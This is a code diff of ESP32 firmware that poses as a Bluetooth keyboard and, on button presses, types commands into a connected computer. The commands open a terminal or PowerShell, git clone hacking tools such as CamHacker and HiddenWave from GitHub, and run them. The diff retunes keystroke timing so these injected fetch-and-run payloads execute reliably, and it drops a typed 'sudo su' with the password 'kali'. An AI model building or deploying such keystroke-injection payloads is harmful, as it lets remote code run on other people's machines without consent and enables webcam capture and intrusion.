@@ -122,20 +122,20 @@ void loop() {
       Serial.println("Button 2: Secret Messaging (Pin 17)");
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("powershell", 10); delay(100); 
+      sendString("powershell", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(4000);
-      sendString("cd Desktop", 10); delay(100); 
+      sendString("cd Desktop", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("git clone https://github.com/sachinpandey7709/Secret-Messaging.git", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
+      sendString("git clone https://github.com/sachinpandey7709/Secret-Messaging.git", 50); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd Secret-Messaging", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
+      sendString("cd Secret-Messaging", 50); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(3000);
-      sendString("python code2.py", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
+      sendString("python code2.py", 50); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(3000);
       Serial.println("Secret Messaging Payload executed");
     }
@@ -149,33 +149,31 @@ void loop() {
       bleKeyboard.releaseAll(); delay(1000);
       Serial.println("Fake Update Screen Payload executed");
     }
-
-    // Button 4: CamHacker (Pin 19)
+    
+    // Trigger 4: CamHacker (Pin 19)
     if (lastState4 == HIGH && state4 == LOW) {
       Serial.println("Button 4: CamHacker (Pin 19)");
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(4000);
-      sendString("cd Desktop", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("sudo su", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(3000);
-      sendString("kali", 10); delay(3000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("git clone https://github.com/KasRoudra/CamHacker", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd CamHacker", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(3000);
-      sendString("bash ch.sh", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(3000);
+      delay(3000); 
+      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
+      Serial.println("Terminal opened");
+      sendString("git clone https://github.com/KasRoudra/CamHacker", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
+      Serial.println("Git clone completed");
+      sendString("cd CamHacker", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
+      Serial.println("Changed to CamHacker directory");
+      sendString("chmod +x ch.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
+      Serial.println("Set executable permissions");
+      sendString("bash ch.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
       Serial.println("CamHacker Payload executed");
     }
 
@@ -231,17 +229,20 @@ void loop() {
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(120); 
-      bleKeyboard.releaseAll(); delay(700);
-      sendString("git clone https://github.com/techchipnet/HiddenWave.git", 180); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(6000);
-      sendString("cd HiddenWave", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(800);
-      sendString("python3 HiddenWave.py", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
+      delay(3000); 
+      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
+      Serial.println("Terminal opened");
+      sendString("git clone https://github.com/techchipnet/HiddenWave.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
+      Serial.println("Git clone completed");
+      sendString("cd HiddenWave", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
+      Serial.println("Changed to HiddenWave directory");
+      sendString("python3 HiddenWave.py", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
       Serial.println("HiddenWave Payload executed");
     }
 
@@ -251,29 +252,24 @@ void loop() {
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(5000);
-      sendString("cd Desktop", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("sudo su", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("kali", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("git clone https://github.com/techchipnet/CanaryTokensDetector.git", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd CanaryTokensDetector", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("chmod +x canarytokendetector.sh", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("./canarytokendetector.sh", 130); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(100);
-      bleKeyboard.releaseAll(); delay(1000);
+      delay(3000); 
+      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
+      Serial.println("Terminal opened");
+      sendString("git clone https://github.com/techchipnet/CanaryTokensDetector.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
+      Serial.println("Git clone completed");
+      sendString("cd CanaryTokensDetector", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
+      Serial.println("Changed to CanaryTokensDetector directory");
+      sendString("chmod +x canarytokendetector.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
+      Serial.println("Set executable permissions");
+      sendString("./canarytokendetector.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500);
+      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
       Serial.println("CanaryTokensDetector Payload executed");
     }
 
@@ -492,5 +488,6 @@ void loop() {
   }
   delay(50); // Debounce/stability
 }
+
 
 
